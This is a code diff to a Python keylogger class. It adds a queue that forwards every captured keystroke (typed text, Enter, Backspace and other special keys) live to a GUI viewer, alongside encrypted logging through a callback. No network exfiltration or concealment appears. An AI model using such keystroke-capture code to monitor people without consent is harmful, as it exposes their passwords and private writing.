@@ -3,14 +3,16 @@ from datetime import datetime
 import string
 import threading
 import time
+import queue  # NEW
 
 
 class KeyloggerService:
-    def __init__(self, callback, combine=True, idle_ms=800):
+    def __init__(self, callback, combine=True, idle_ms=800, ui_queue: "queue.Queue|None" = None):
         """
         callback: function(str) -> None  (receives plaintext line to be encrypted+written)
         combine: if True, buffer characters into words/sentences
         idle_ms: flush buffer after this many ms of no typing
+        ui_queue: optional Queue to forward events to the GUI live (dicts)
         """
         self._listener = None
         self._callback = callback
@@ -20,6 +22,8 @@ class KeyloggerService:
         self._last_ts = 0.0
         self._idle_timer = None
         self._running = False
+
+        self._ui_queue = ui_queue   # NEW
 
         # define what counts as printable char we merge
         self._printables = set(string.printable) - set("\r\n\t")
@@ -36,7 +40,7 @@ class KeyloggerService:
             return
         text = "".join(self._buf)
         self._buf.clear()
-        self._send_line(text)
+        self._send_line(text, kind="TEXT")
 
     def _schedule_idle_flush(self):
         if self._idle_timer:
@@ -47,10 +51,34 @@ class KeyloggerService:
         self._idle_timer.daemon = True
         self._idle_timer.start()
 
-    def _send_line(self, text: str):
+    def _forward_to_ui(self, *, ts: str, kind: str, text: str):
+        """Send a GUI-friendly event if a ui_queue is attached."""
+        if not self._ui_queue:
+            return
+        evt = {
+            "ts": ts,
+            "type": kind.upper(),       # "KEY" or "TEXT"
+            "key": text if kind.upper() == "KEY" else text,
+            "window": "",               # you can fill this if you track focus elsewhere
+            "_already_logged": True,    # IMPORTANT: prevent GUI from logging twice
+        }
+        try:
+            self._ui_queue.put_nowait(evt)
+        except Exception:
+            pass
+
+    def _send_line(self, text: str, kind: str | None = None):
         # keep the same “timestamp - …” layout the viewer already parses
-        line = f"{self._now_str()} - {text}"
+        ts = self._now_str()
+        line = f"{ts} - {text}"
         self._callback(line)
+
+        # infer kind if not provided
+        if kind is None:
+            kind = "KEY" if (text.startswith("[") and text.endswith("]")) else "TEXT"
+
+        # also forward to GUI live
+        self._forward_to_ui(ts=ts, kind=kind, text=text)
 
     # ---------- key handling ----------
     def _on_press(self, key):
@@ -61,10 +89,10 @@ class KeyloggerService:
         if not self.combine:
             try:
                 ch = key.char
-                self._send_line(ch)
+                self._send_line(ch, kind="TEXT" if len(ch) == 1 else "KEY")
             except AttributeError:
                 name = getattr(key, "name", str(key))
-                self._send_line(f"[{name}]")
+                self._send_line(f"[{name}]", kind="KEY")
             return
 
         # combine mode:
@@ -85,7 +113,7 @@ class KeyloggerService:
             else:
                 # non printable -> flush & record name
                 self._flush()
-                self._send_line(f"[NonPrintable:{repr(ch)}]")
+                self._send_line(f"[NonPrintable:{repr(ch)}]", kind="KEY")
             return
 
         # special keys
@@ -96,7 +124,7 @@ class KeyloggerService:
             self._schedule_idle_flush()
         elif name in ("enter", "return"):
             self._flush()
-            self._send_line("[Enter]")
+            self._send_line("[Enter]", kind="KEY")
         elif name in ("tab",):
             self._buf.append("\t")
             self._flush()
@@ -106,13 +134,13 @@ class KeyloggerService:
                 self._schedule_idle_flush()
             else:
                 # nothing to delete -> just record
-                self._send_line("[Backspace]")
+                self._send_line("[Backspace]", kind="KEY")
         else:
             # flush any pending text, then record the special key
             self._flush()
             # normalize e.g. shift_r -> Shift R
             pretty = name.replace("_", " ").title()
-            self._send_line(f"[{pretty}]")
+            self._send_line(f"[{pretty}]", kind="KEY")
 
     def start(self):
         if self._running:
@@ -132,3 +160,7 @@ class KeyloggerService:
             self._listener.stop()
             self._listener = None
         self._running = False
+
+    # OPTIONAL: allow setting/overriding the UI queue later
+    def set_ui_queue(self, q: "queue.Queue|None"):
+        self._ui_queue = q
